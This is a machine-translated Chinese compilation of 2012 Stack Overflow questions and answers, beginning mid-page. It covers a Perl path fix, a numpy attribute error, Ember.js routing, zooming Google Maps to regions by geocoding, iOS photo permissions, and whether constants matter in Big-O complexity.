更多信息请访问[http://perldoc.perl.org/File/Basename.html](http://perldoc.perl.org/File/Basename.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:48:12.703

你的问题是你设置

```
my $date_file = $file 
```

然后你写信给

```
results/${date_file} 
```

如果您尝试打印`$date_file`，您会发现它类似于`spool/20121025_0000.txt`. 因此，当您将其连接到 时`results/`，您可以看到为什么它们最终会出现在`results/spool`

简单的修复就是说

```
my $date_file = substr($file, 6); 
```

剪掉`spool/`.

# python - 绘制一些数据时出现python matplotlib错误

> ID：13061155
> 
> 赞同：0
> 
> 时间：2012-10-25T03:33:10.200
> 
> 标签：python, numpy, matplotlib

我正在尝试绘制一些数据，并且从指出的行中收到此错误。我用谷歌搜索了这条线，但找不到关于这个问题的任何有意义的讨论。我是 Python 新手，所以我一直在尝试解决这些问题。

```
 pl.figure()
 ax = pl.subplot(111)
 ax.plot(Xk[:,0], Xk[:,1], '.')

 ERROR=>>> twos = (y == 2).nonzero()[0]
 for i in twos:
    imagebox = OffsetImage(X[i,:].reshape(28,28))
    location = Xk[i,0], Xk[i,1]
    ab = AnnotationBbox(imagebox, location, boxcoords='data', pad=0.)
    ax.add_artist(ab)

 pl.show() 
```

这是错误信息

```
 AttributeError: 'bool' object has no attribute 'nonzero' 
```

任何线索，似乎`y`都不是一个可比的实体。

我正在尝试从示例文件中按摩代码以获取我自己的东西，如果这有点多余，请原谅。

我很感激帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T14:30:46.293

以下对我有用（来自 iPython）：

```
In [11]: y = arange(5); (y==2).nonzero()[0]
Out[11]: array([2]) 
```

而以下没有：

```
In [13]: y = range(5);  (y==2).nonzero()[0]
------------------------------------------------------------
Traceback (most recent call last):
  File "<ipython console>", line 1, in <module>
AttributeError: 'bool' object has no attribute 'nonzero' 
```

因此，正如@DSM 的评论所暗示的那样 - 确保 y 是一个 numpy 数组，而不仅仅是某个列表或任何其他对象

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T03:47:10.860

您正在尝试将某些内容分配给变量调用`twos`：

```
twos = (y == 2).nonzero()[0] 
```

Python 告诉你`(y == 2)`没有这样的属性。这就是逻辑，因为括号会导致对表达式进行评估，该表达式`y == 2`可以是`True`or `False`。

在 python using`.`中，您试图访问某个实例的方法或属性。如果你是一个字符串，它有绑定到它的方法，那么所有字符串都有：

```
In [133]: A='lorem ipsum'
# pressed Tab
In [134]: A.
A.capitalize  A.endswith    A.isalnum     A.istitle     A.lstrip      A.rjust       A.splitlines  A.translate
A.center      A.expandtabs  A.isalpha     A.isupper     A.partition   A.rpartition  A.startswith  A.upper
A.count       A.find        A.isdigit     A.join        A.replace     A.rsplit      A.strip       A.zfill
A.decode      A.format      A.islower     A.ljust       A.rfind       A.rstrip      A.swapcase    
A.encode      A.index       A.isspace     A.lower       A.rindex      A.split       A.title 
```

如果您不熟悉 python、numpy 和 matplotlib，我建议您开始使用 IPython。你对python的学习会更顺畅。

作为 Tab 按的替代方法，您可以执行以下操作`dir(someObject)`：

```
In [134]: dir(A)
Out[134]: 
['__add__',
 '__class__',
 '__contains__',
 '__delattr__',
 '__doc__',
 '__eq__',
  .... snipped...
 'startswith',
 'strip',
 'swapcase',
 'title',
 'translate',
 'upper',
 'zfill'] 
```

# dynamic - 如何用Router处理动态内容？

> ID：13061156
> 
> 赞同：3
> 
> 时间：2012-10-25T03:33:15.117
> 
> 标签：dynamic, view, ember.js, router

我正在通过 Ember.js 开发一个应用程序，该应用程序维护类别，在类别的列表视图中，当用户单击创建按钮时，我们将动态显示新的类别表单。在使用 Ember 的 Router 之前，我们使用如下机制：

看法：

```
LCF.CategoriesView = Ember.View.extend({
    templateName:'admin/app/templates/categories/list',
    isNewVisible:false,

    showNew:function () {
        this.set('isNewVisible', true);
    },

    hideNew:function () {
        this.set('isNewVisible', false);
    }
}); 
```

模板：

```
<div class="well well-small">
   <a class="btn  btn-primary" href="#" {{action "showNewCategory"}}>Create</a>
</div>
{{#if view.isNewVisible}}
  {{view LCF.NewCategoryView}}
{{/if}} 
```

使用路由器后，事件将由路由处理，我将代码更改如下：

路由器：

```
 categories:Em.Route.extend({
        route:'/categories',

        connectOutlets:function (router, context) {
            router.get('applicationController').connectOutlet('categories', router.get('store').findAll(LCF.Category));
        },

        showNewCategory:function (router) {
            router.transitionTo('categories.newCategory', {});
        },

        index:Ember.Route.extend({
            route:'/'
        }),

        newCategory:Em.Route.extend({
            route:'/new',

            cancelEdit:function (router) {
                router.transitionTo('categories.index');
            },

            connectOutlets:function (router, context) {
                router.get('categoriesController').connectOutlet('editCategory', {});
                router.get('editCategoryController').enterEditing();
            }
        }) 
```

模板：

```
<div class="well well-small">
    <a class="btn  btn-primary" href="#" {{action "showNewCategory"}}>Create</a>
</div>
{{outlet}} 
```

有用。

我的问题是：

*   这是处理动态视图的正确方法吗？我们是否需要为页面中的每个浮动层创建一个状态/控制器？
*   即使应用程序仍显示类别，URL 也会更改。
*   模板中只有一个{{outlet}}，如果要显示多个动态视图，怎么办？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T07:00:30.557

*   对我来说，这看起来很不错。对于状态创建和控制器......这里没有是/否的答案。通常我会说你为每个上下文逻辑创建一个控制器，当你想处理一个新的应用程序状态时你创建一个路由。在您的示例中，您做得很好，类别（状态以概述所有类别），显示（显示特定类别）...

*   这里有什么问题？对不起：s，我不明白你想在这里知道什么。

*   这里的答案很简单，如果页面中有多个动态视图要显示，则可以使用多个 {{outlets}}，使用命名的 outlet。请参阅：[Ember.js 路由器应用架构——如何拥有多个嵌套的视图/控制器对](https://stackoverflow.com/questions/12824917/ember-js-router-app-architecture-how-to-have-multiple-nested-view-controller/)

# javascript - Google Maps API 放大特定区域

> ID：13061158
> 
> 赞同：0
> 
> 时间：2012-10-25T03:33:28.420
> 
> 标签：javascript, api, google-maps, google-maps-api-3

我正在尝试使 Google Maps API 响应 elementclick 并放大到特定区域。

例如。地图显示整个美国，我单击亚利桑那州，我希望地图放大整个亚利桑那州。然后我可以点击清除并重置地图，或者点击另一个州，比如佛罗里达州。并让它在那里放大。

此外，这需要一个全球性的解决方案。我在欧洲、德国、俄罗斯、澳大利亚有地区，我也想添加这个功能。

感谢您的时间。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T03:51:49.483

[您可以使用 Google Maps API v3 地理编码服务缩放到它为州](http://geocodezip.com/v3_zoom2stateSelectList.html)和[国家/](http://geocodezip.com/v3_zoom2countrySelectList.html)地区返回的视口

**代码片段（放大到美国各州）**

```
var map = null;
var geocoder = null;

function initialize() {
  geocoder = new google.maps.Geocoder();
  var myOptions = {
    zoom: 2,
    center: new google.maps.LatLng(47.288828765662416, 7.945261001586914),
    mapTypeControl: true,
    mapTypeControlOptions: {
      style: google.maps.MapTypeControlStyle.DROPDOWN_MENU
    },
    navigationControl: true,
    mapTypeId: google.maps.MapTypeId.ROADMAP
  };
  map = new google.maps.Map(document.getElementById("map_canvas"), myOptions);
  findAddress("United States");
}

function findAddress(address) {
  var addressStr = document.getElementById("stateselect").value;
  if (!address && (addressStr != ''))
    address = "State of " + addressStr;
  else
    address = addressStr;
  if ((address != '') && geocoder) {
    geocoder.geocode({
      'address': address
    }, function(results, status) {
      if (status == google.maps.GeocoderStatus.OK) {
        if (status != google.maps.GeocoderStatus.ZERO_RESULTS) {
          if (results && results[0] &&
            results[0].geometry && results[0].geometry.viewport)
            map.fitBounds(results[0].geometry.viewport);
        } else {
          alert("No results found");
        }
      } else {
        alert("Geocode was not successful for the following reason: " + status);
      }
    });
  }
}
initialize();
```

```
html,
body {
  width: 100%;
  height: 100%;
  padding: 0px;
  margin: 0px;
}

#map_canvas {
  width: 100%;
  height: 100%;
}
```

```
<script type="text/javascript" src="https://maps.google.com/maps/api/js?key=AIzaSyCkUOdZ5y7hMm0yrcCQoCvLwzdM6M8s5qk"></script>
<h2>Zoom to State with Select List (Google Maps API)</h2>
<div id="TOPNAV">
  <select id="stateselect" name="countryselect" class="textfeld" onclick="findAddress();return false" onchange="findAddress();return false" onfocus="">
    <option value=''>Select a State....</option>
    <option value="Alabama">Alabama</option>
    <option value="Alaska">Alaska</option>
    <option value="Arizona">Arizona</option>
    <option value="Arkansas">Arkansas</option>
    <option value="California">California</option>
    <option value="Colorado">Colorado</option>
    <option value="Connecticut">Connecticut</option>
    <option value="Delaware">Delaware</option>
    <option value="Florida">Florida</option>
    <option value="Georgia">Georgia</option>
    <option value="Hawaii">Hawaii</option>
    <option value="Idaho">Idaho</option>
    <option value="Illinois">Illinois</option>
    <option value="Indiana">Indiana</option>
    <option value="Iowa">Iowa</option>
    <option value="Kansas">Kansas</option>
    <option value="Kentucky">Kentucky</option>
    <option value="Louisiana">Louisiana</option>
    <option value="Maine">Maine</option>
    <option value="Maryland">Maryland</option>
    <option value="Massachusetts">Massachusetts</option>
    <option value="Michigan">Michigan</option>
    <option value="Minnesota">Minnesota</option>
    <option value="Mississippi">Mississippi</option>
    <option value="Missouri">Missouri</option>
    <option value="Montana">Montana</option>
    <option value="Nebraska">Nebraska</option>
    <option value="Nevada">Nevada</option>
    <option value="New Hampshire">New Hampshire</option>
    <option value="New Jersey">New Jersey</option>
    <option value="New Mexico">New Mexico</option>
    <option value="New York">New York</option>
    <option value="North Carolina">North Carolina</option>
    <option value="North Dakota">North Dakota</option>
    <option value="Ohio">Ohio</option>
    <option value="Oklahoma">Oklahoma</option>
    <option value="Oregon">Oregon</option>
    <option value="Pennsylvania">Pennsylvania</option>
    <option value="Rhode Island">Rhode Island</option>
    <option value="South Carolina">South Carolina</option>
    <option value="South Dakota">South Dakota</option>
    <option value="Tennessee">Tennessee</option>
    <option value="Texas">Texas</option>
    <option value="Utah">Utah</option>
    <option value="Vermont">Vermont</option>
    <option value="Virginia">Virginia</option>
    <option value="Washington">Washington</option>
    <option value="West Virginia">West Virginia</option>
    <option value="Wisconsin">Wisconsin</option>
    <option value="Wyoming">Wyoming</option>
  </select>
</div>
<div id="map_canvas" style="width: 800px; height: 500px"></div>
```

**代码片段（放大到国家）**

```
// globals
var map = null;
var geocoder = null;

function initialize() {
  geocoder = new google.maps.Geocoder();
  var myOptions = {
    zoom: 2,
    center: new google.maps.LatLng(47.288828765662416, 7.945261001586914),
    mapTypeControl: true,
    mapTypeControlOptions: {
      style: google.maps.MapTypeControlStyle.DROPDOWN_MENU
    },
    navigationControl: true,
    mapTypeId: google.maps.MapTypeId.ROADMAP
  };
  map = new google.maps.Map(document.getElementById("map_canvas"), myOptions);
}

function findAddress(address) {
  if (!address)
    var address = document.getElementById("countryselect").value;
  if ((address != '') && geocoder) {
    geocoder.geocode({
      'address': address
    }, function(results, status) {
      google.maps.event.addListenerOnce(map, 'center_changed', centerChanged);
      google.maps.event.addListenerOnce(map, 'bounds_changed', centerChanged);
      if (status == google.maps.GeocoderStatus.OK) {
        if (status != google.maps.GeocoderStatus.ZERO_RESULTS) {
          if ((results && results[0] && results[0].formatted_address) && (results[0].formatted_address == "Antarctica")) {
            map.setCenter(new google.maps.LatLng(-75, 0));
            map.setZoom(3);
          } else if (results && results[0] && results[0].geometry && results[0].geometry.viewport) {
            map.fitBounds(results[0].geometry.viewport);
            var htmlStr = results[0].formatted_address + "<br>";
            htmlStr += "viewport=" + results[0].geometry.viewport.toUrlValue(6) + "<br>";
            htmlStr += "bounds=" + results[0].geometry.bounds.toUrlValue(6) + "<br>";
            document.getElementById('info').innerHTML = htmlStr;
          } else if (results && results[0] && results[0].geometry && results[0].geometry.bounds) {
            map.fitBounds(results[0].geometry.bounds);
            var htmlStr = results[0].formatted_address + "<br>";
            htmlStr += "bounds=" + results[0].geometry.bounds.toUrlValue(6) + "<br>";
            document.getElementById('info').innerHTML = htmlStr;
          } else {
            var htmlStr = results[0].formatted_address + "" < br > "";
            document.getElementById('info').innerHTML = htmlStr;
          }
        } else {
          alert("No results found");
        }
      } else {
        alert("Geocode was not successful for the following reason: " + status);
      }
    });
  }
}

function centerChanged() {
  document.getElementById('info').innerHTML += "<br>center=" + map.getCenter().toUrlValue(6) + "<br>map.getBounds=" + map.getBounds().toUrlValue(6);
  google.maps.event.addListenerOnce(map, 'center_changed', function() {
    document.getElementById('info').innerHTML += "<br>center=" + map.getCenter().toUrlValue(6) + "<br>map.getBounds=" + map.getBounds().toUrlValue(6);
  });
  if (map.getCenter().lat() < -85) {
    google.maps.event.addListenerOnce(map, 'center_changed', function() {
      map.setZoom(3);
    });
    map.setCenter(new google.maps.LatLng(-75, 0));
  } else if (map.getCenter().lat() > 85) {
    google.maps.event.addListenerOnce(map, 'center_changed', function() {
      map.setZoom(3);
    });
    map.setCenter(new google.maps.LatLng(75, 0));
  }
}
initialize();
```

```
html,
body {
  width: 100%;
  height: 100%;
  padding: 0px;
  margin: 0px;
}

#map_canvas {
  width: 100%;
  height: 100%;
}
```

```
<script type="text/javascript" src="https://maps.google.com/maps/api/js?key=AIzaSyCkUOdZ5y7hMm0yrcCQoCvLwzdM6M8s5qk"></script>
<h2>Zoom to Country with Select List (Google Maps API)</h2>
<div id="TOPNAV">
  <select id="countryselect" name="countryselect" class="textfeld" onclick="findAddress();return false" onchange="findAddress();return false" onfocus="">
    <option value=''>Select a country....</option>
    <option value="Afghanistan">Afghanistan</option>
    <option value="Albania">Albania</option>
    <option value="Algeria">Algeria</option>
    <option value="American Samoa">American Samoa</option>
    <option value="Andorra">Andorra</option>
    <option value="Angola">Angola</option>
    <option value="Anguilla">Anguilla</option>
    <option value="Antarctica">Antarctica</option>
    <option value="Antigua and Barbuda">Antigua and Barbuda</option>
    <option value="Argentina">Argentina</option>
    <option value="Armenia">Armenia</option>
    <option value="Aruba">Aruba</option>
    <option value="Australia">Australia</option>
    <option value="Austria">Austria</option>
    <option value="Azerbaijan">Azerbaijan</option>
    <option value="Bahamas">Bahamas</option>
    <option value="Bahrain">Bahrain</option>
    <option value="Bangladesh">Bangladesh</option>
    <option value="Barbados">Barbados</option>
    <option value="Belarus">Belarus</option>
    <option value="Belgium">Belgium</option>
    <option value="Belize">Belize</option>
    <option value="Benin">Benin</option>
    <option value="Bermuda">Bermuda</option>
    <option value="Bhutan">Bhutan</option>
    <option value="Bolivia">Bolivia</option>
    <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
    <option value="Botswana">Botswana</option>
    <option value="Bouvet Island">Bouvet Island</option>
    <option value="Brazil">Brazil</option>
    <option value="British Indian Ocean Territory">British Indian Ocean Territory</option>
    <option value="Brunei Darussalam">Brunei Darussalam</option>
    <option value="Bulgaria">Bulgaria</option>
    <option value="Burkina Faso">Burkina Faso</option>
    <option value="Burundi">Burundi</option>
    <option value="Cambodia">Cambodia</option>
    <option value="Cameroon">Cameroon</option>
    <option value="Canada">Canada</option>
    <option value="Cape Verde">Cape Verde</option>
    <option value="Cayman Islands">Cayman Islands</option>
    <option value="Central African Republic">Central African Republic</option>
    <option value="Chad">Chad</option>
    <option value="Chile">Chile</option>
    <option value="China">China</option>
    <option value="Christmas Island">Christmas Island</option>
    <option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
    <option value="Colombia">Colombia</option>
    <option value="Comoros">Comoros</option>
    <option value="Congo">Congo</option>
    <option value="Democratic Republic of the Congo">Congo, the Democratic Republic of the</option>
    <option value="Cook Islands">Cook Islands</option>
    <option value="Costa Rica">Costa Rica</option>
    <option value="Cote D'Ivoire">Cote D'Ivoire</option>
    <option value="Croatia">Croatia</option>
    <option value="Cuba">Cuba</option>
    <option value="Cyprus">Cyprus</option>
    <option value="Czech Republic">Czech Republic</option>
    <option value="Denmark">Denmark</option>
    <option value="Djibouti">Djibouti</option>
    <option value="Dominica">Dominica</option>
    <option value="Dominican Republic">Dominican Republic</option>
    <option value="Ecuador">Ecuador</option>
    <option value="Egypt">Egypt</option>
    <option value="El Salvador">El Salvador</option>
    <option value="Equatorial Guinea">Equatorial Guinea</option>
    <option value="Eritrea">Eritrea</option>
    <option value="Estonia">Estonia</option>
    <option value="Ethiopia">Ethiopia</option>
    <option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option>
    <option value="Faroe Islands">Faroe Islands</option>
    <option value="Fiji">Fiji</option>
    <option value="Finland">Finland</option>
    <option value="France">France</option>
    <option value="French Guiana">French Guiana</option>
    <option value="French Polynesia">French Polynesia</option>
    <option value="French Southern Territories">French Southern Territories</option>
    <option value="Gabon">Gabon</option>
    <option value="Gambia">Gambia</option>
    <option value="Georgia Country">Georgia</option>
    <option value="Germany">Germany</option>
    <option value="Ghana">Ghana</option>
    <option value="Gibraltar">Gibraltar</option>
    <option value="Greece">Greece</option>
    <option value="Greenland">Greenland</option>
    <option value="Grenada">Grenada</option>
    <option value="Guadeloupe">Guadeloupe</option>
    <option value="Guam">Guam</option>
    <option value="Guatemala">Guatemala</option>
    <option value="Guinea">Guinea</option>
    <optio n value="Guinea-Bissau">Guinea-Bissau</option>
      <option value="Guyana">Guyana</option>
      <option value="Haiti">Haiti</option>
      <option value="Heard Island and Mcdonald Islands">Heard Island and Mcdonald Islands</option>
      <option value="Vatican City State">Holy See (Vatican City State)</option>
      <option value="Honduras">Honduras</option>
      <option value="Hong Kong">Hong Kong</option>
      <option value="Hungary">Hungary</option>
      <option value="Iceland">Iceland</option>
      <option value="India">India</option>
      <option value="Indonesia">Indonesia</option>
      <option value="Iran Country">Iran, Islamic Republic of</option>
      <option value="Iraq">Iraq</option>
      <option value="Ireland">Ireland</option>
      <option value="Israel">Israel</option>
      <option value="Italy">Italy</option>
      <option value="Jamaica">Jamaica</option>
      <option value="Japan">Japan</option>
      <option value="Jordan">Jordan</option>
      <option value="Kazakhstan">Kazakhstan</option>
      <option value="Kenya">Kenya</option>
      <option value="Kiribati">Kiribati</option>
      <option value="North Korea">Korea, North</option>
      <option value="South Korea">Korea, South</option>
      <option value="Kuwait">Kuwait</option>
      <option value="Kyrgyzstan">Kyrgyzstan</option>
      <option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option>
      <option value="Latvia">Latvia</option>
      <option value="Lebanon">Lebanon</option>
      <option value="Lesotho">Lesotho</option>
      <option value="Liberia">Liberia</option>
      <option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option>
      <option value="Liechtenstein">Liechtenstein</option>
      <option value="Lithuania">Lithuania</option>
      <option value="Luxembourg">Luxembourg</option>
      <option value="Macao Country">Macao</option>
      <option value="Macedonia">Macedonia, the Former Yugoslav Republic of</option>
      <option value="Madagascar">Madagascar</option>
      <option value="Malawi">Malawi</option>
      <option value="Malaysia">Malaysia</option>
      <option value="Maldives">Maldives</option>
      <option value="Mali">Mali</option>
      <option value="Malta">Malta</option>
      <option value="Marshall Islands">Marshall Islands</option>
      <option value="Martinique">Martinique</option>
      <option value="Mauritania">Mauritania</option>
      <option value="Mauritius">Mauritius</option>
      <option value="Mayotte">Mayotte</option>
      <option value="Mexico">Mexico</option>
      <option value="Federated States of Micronesia">Micronesia, Federated States of</option>
      <option value="Moldova">Moldova, Republic of</option>
      <option value="Monaco">Monaco</option>
      <option value="Mongolia">Mongolia</option>
      <option value="Montserrat">Montserrat</option>
      <option value="Montenegro">Montenegro</option>
      <option value="Morocco">Morocco</option>
      <option value="Mozambique">Mozambique</option>
      <option value="Myanmar">Myanmar</option>
      <option value="Namibia">Namibia</option>
      <option value="Nauru">Nauru</option>
      <option value="Nepal">Nepal</option>
      <option value="Netherlands">Netherlands</option>
      <option value="Netherlands Antilles">Netherlands Antilles</option>
      <option value="New Caledonia">New Caledonia</option>
      <option value="New Zealand">New Zealand</option>
      <option value="Nicaragua">Nicaragua</option>
      <option value="Niger">Niger</option>
      <option value="Nigeria">Nigeria</option>
      <option value="Niue">Niue</option>
      <option value="Norfolk Island">Norfolk Island</option>
      <option value="Northern Mariana Islands">Northern Mariana Islands</option>
      <option value="Norway">Norway</option>
      <option value="Oman">Oman</option>
      <option value="Pakistan">Pakistan</option>
      <option value="Palau">Palau</option>
      <option value="Palestine">Palestine</option>
      <option value="Panama">Panama</option>
      <option value="Papua New Guinea">Papua New Guinea</option>
      <option value="Paraguay">Paraguay</option>
      <option value="Peru">Peru</option>
      <option value="Philippines">Philippines</option>
      <option value="Pitcairn">Pitcairn</option>
      <option value="Poland">Poland</option>
      <option value="Portugal">Portugal</option>
      <option value="Puerto Rico">Puerto Rico</option>
      <option value="Qatar">Qatar</option>
      <option value="Reunion">Reunion</option>
      <option value="Romania">Romania</option>
      <option value="Russian Federation">Russian Federation</option>
      <option value="Rwanda">Rwanda</option>
      <option value="Saint Helena Country">Saint Helena</option>
      <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
      <option value="Saint Lucia">Saint Lucia</option>
      <option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option>
      <option value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines</option>
      <option value="Samoa">Samoa</option>
      <option value="San Marino">San Marino</option>
      <option value="Sao Tome and Principe">Sao Tome and Principe</option>
      <option value="Saudi Arabia">Saudi Arabia</option>
      <option value="Senegal">Senegal</option>
      <option value="Serbia">Serbia</option>
      <option value="Seychelles">Seychelles</option>
      <option value="Sierra Leone">Sierra Leone</option>
      <option value="Singapore">Singapore</option>
      <option value="Slovakia">Slovakia</option>
      <option value="Slovenia">Slovenia</option>
      <option value="Solomon Islands">Solomon Islands</option>
      <option value="Somalia">Somalia</option>
      <option value="South Africa">South Africa</option>
      <option value="South Georgia and the South Sandwich Islands">South Georgia and the South Sandwich Islands</option>
      <option value="Spain">Spain</option>
      <option value="Sri Lanka">Sri Lanka</option>
      <option value="Sudan">Sudan</option>
      <option value="Suriname">Suriname</option>
      <option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option>
      <option value="Swaziland">Swaziland</option>
      <option value="Sweden">Sweden</option>
      <option value="Switzerland">Switzerland</option>
      <option value="Syrian Arab Republic">Syrian Arab Republic</option>
      <option value="Taiwan">Taiwan, Province of China</option>
      <option value="Tajikistan">Tajikistan</option>
      <option value="Tanzania">Tanzania, United Republic of</option>
      <option value="Thailand">Thailand</option>
      <option value="Timor-Leste">Timor-Leste</option>
      <option value="Togo">Togo</option>
      <option value="Tokelau">Tokelau</option>
      <option value="Tonga">Tonga</option>
      <option value="Trinidad and Tobago">Trinidad and Tobago</option>
      <option value="Tunisia">Tunisia</option>
      <option value="Turkey">Turkey</option>
      <option value="Turkmenistan">Turkmenistan</option>
      <option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
      <option value="Tuvalu">Tuvalu</option>
      <option value="Uganda">Uganda</option>
      <option value="Ukraine">Ukraine</option>
      <option value="United Arab Emirates">United Arab Emirates</option>
      <option value="United Kingdom">United Kingdom</option>
      <option value="United States">United States</option>
      <!-- <option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option> -->
      <option value="Uruguay">Uruguay</option>
      <option value="Uzbekistan">Uzbekistan</option>
      <option value="Vanuatu">Vanuatu</option>
      <option value="Venezuela">Venezuela</option>
      <option value="Viet Nam">Viet Nam</option>
      <option value="British Virgin Islands">Virgin Islands, British</option>
      <option value="U.S. Virgin Islands">Virgin Islands, U.S.</option>
      <option value="Wallis and Futuna">Wallis and Futuna</option>
      <option value="Western Sahara">Western Sahara</option>
      <option value="Yemen">Yemen</option>
      <option value="Zambia">Zambia</option>
      <option value="Zimbabwe">Zimbabwe</option>
  </select>
</div>
<div id="map_canvas" style="width: 800px; height: 500px"></div>
<div id="info"></div>
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T03:48:49.250

您可以定义坐标并使用缩放级别，然后将地图以该坐标居中。

考虑这个脚本。

```
var zoomLevel = 18; //The higher the zoomLevel means zoom in at a higher resolution
var map;

var arizonaCoor = new google.maps.LatLng(39.739318, -89.266507);
var otherCoor = new google.maps.LatLng(49.733418, -30.234507);
var origCoor = new google.maps.LatLng(39.739318, -89.266507);

var mapOptions = {
center: origCoor,
zoom: 5,
mapTypeId: google.maps.MapTypeId.ROADMAP
};
map = new google.maps.Map(document.getElementById('map_canvas'),
            mapOptions);

function onArizonaClick(){
    map.setCenter(arizonaCoor, zoomLevel);

}
function onClear(){
    map.setCenter(origCoor, 5);
} 
```

# iphone - 如何在 iOS5 中重新请求照片访问权限？

> ID：13061164
> 
> 赞同：7
> 
> 时间：2012-10-25T03:34:10.387
> 
> 标签：iphone, ios, ios5, alassetslibrary

如果用户拒绝了应用程序的照片访问，我知道它可以`[ALAssetsLibrary authorizationStatus]`在 iOS6 中检查，并在`Settings->Privacy`.

但是如何在 iOS5 中检查并重新打开它呢？

是否可以重新请求照片访问权限？

特别感谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T03:53:16.003

我猜您是在谈论用户看到的允许应用程序使用其位置的请求。很抱歉，除了检测到他们拒绝了请求并通知他们遗漏的内容并提供有关如何进入“设置”并手动更改设置的说明之外，您无能为力。

您可以使用以下方法测试用户是否拒绝了位置请求：

```
[CLLocationManager authorizationStatus] == kCLAuthorizationStatusDenied 
```

还有其他情况要检查...最好阅读文档。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T03:42:34.750

在 iOS 5 下，用户不能拒绝访问他们的照片。没有什么可以请求或重新请求的。地址簿、日历和提醒也是如此。所有这些仅适用于 iOS 6。

# algorithm - 为什么两个 O(n) 程序相同？常数重要吗？

> ID：13061165
> 
> 赞同：2
> 
> 时间：2012-10-25T03:34:17.137
> 
> 标签：algorithm, complexity-theory

> **可能的重复：**
> [复杂性。为什么常数不重要？](https://stackoverflow.com/questions/9106538/complexity-why-dont-constants-matter)

我有一个关于代码/算法复杂性的简单问题。我非常了解基本的复杂性概念，例如相对于输入的增长顺序，为什么 O(n) 优于 O(n^2) 等。但是，我不确定常量是否真的重要，因为它似乎对我来说，他们应该但没有人考虑或谈论他们。您能否改进具有相同复杂性的代码。可以说我有一个具有一定顺序复杂性的代码可以说 O(n)。假设此代码在 10 分钟内运行某些输入。如果我重复两次代码，现在代码在 20 分钟内运行会怎样。尽管复杂性相同，但 20 分钟超过 10 分钟是一件大事。无论复杂性如何，这些事情是否重要？如果不是为什么？如果是，为什么？请解释。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T03:39:14.993

在理论复杂性分析中，系数根本不重要。在实践中，它们非常重要。这就是为什么几乎每个人仍然使用（指数复杂度）单纯形算法而不是（多项式复杂度）内点算法来解决优化问题。

如果您正在进行算法分析并想知道 O() 行为，那么常量是无关紧要的。如果您想知道对于特定范围的问题，哪段代码运行得更快，那么一切都很重要。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T03:39:51.597

我认为您将复杂性的真实概念与不同的性能示例混合在一起。通过复杂性，我们的意思是：**如果 n 增长，处理步骤增长的顺序是什么。**

例如，您正在执行线性搜索，在这种情况下您的订单是 O(n)。这里的意思是：如果 n = 5，并且需要 5 秒，那么对于 n=10，将需要 10 秒，即关系是线性的。

没有区别，如果顺序是 O(5n)，即相同的搜索需要 25 秒，n=5，然后对于 n=10，需要 50 秒。我仍然可以说，它的 O(n) 即直接依赖。

同样的例子也适用于 O(n^2) 的排序算法。

在您的示例中，**提到的改进确实很重要**，但它不会改变复杂性的顺序，即关系。如果我们可以将处理时间减少两倍，**这是一个很大的改进**，前提`n`是数量很大，例如时间从 20 分钟减少到 10 分钟。如果您更改算法以改变所用时间与 n 增长的关系，那么 O(n) 也会改变:)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T08:23:09.983

这是理论和实践之间的很大差异。为此有几点需要考虑：

*   对于实际实现，这些常量可能不清楚。您通常无法从给定的实现中确定这些常量。举个例子，你有两个 O(N) 算法来解决同一个问题，但是一个需要 2N 次操作，第二个只需要 N 次操作。人们可能会认为具有 N 次操作的那个运行得更快，但事实可能并非如此。由于更好的缓存或管道使用等，我们可能有 2N 个操作，每个操作只需要 1 个周期，而另一种算法可能需要 N 个操作，每个操作需要 4 个周期。所以运算多的算法可能还是会更快。在不同的硬件上，这可能看起来非常不同。因此，除非您知道确切的硬件，否则理论分析是一个很好的指南。在真正的硬件上，交互通常非常复杂，只有基准测试才能给你一个很好的提示。

*   对于实时系统，情况又大不相同。在这里，人们通常对最坏情况执行时间 (WCET) 感兴趣，它指的是算法可能花费的实际时间。在这种情况下，常量确实很重要。然而，在这种情况下，问题的大小也是已知的（通常是来自几个传感器的一组输入），因此分析有很大不同。

*   硬件的影响可能会变得如此之大，以至于理论上看起来更糟糕的算法实际上可能优于看起来更好的算法，至少对于所有相关的问题大小。使用树的算法（通常在理论上更好）与使用平面数组结构的算法（通常在理论上更差）的情况通常是这种情况。然而，通常平面数组更好，因为它可以更有效地缓存。但是，有时可以使用两全其美的方法，例如在将堆实现为数组时（这几乎总是优于排序树）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-25T03:40:10.273

> 复杂性理论并不重要，它只对函数如何随着输入大小的增长而缩放感兴趣。
> 
> 常数根本不会影响函数在输入大小向无穷大增长时的行为方式。
> 
> 但是，如果您对实际运行某段代码感兴趣，您可能会对较大的常量开销以及函数如何在较小的输入大小下执行感兴趣。
> 
> 复杂性理论与实践的区别。

这是这个问题的一个很好的答案。

[复杂。为什么常数不重要？](https://stackoverflow.com/questions/9106538/complexity-why-dont-constants-matter)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-25T03:42:26.573

当然，如果你的算法比它需要的慢两倍，这很重要。关键是，我们关心算法在“n”方面的性能，因为“n”有可能非常大。

让我们举一个实际的例子。假设您有一个包含 n 个项目的列表。您的算法遍历列表一次。那是订单n。如果它遍历列表两次，那可能会花费更长的时间，而且速度会更慢——如果没有必要，你不应该这样做。

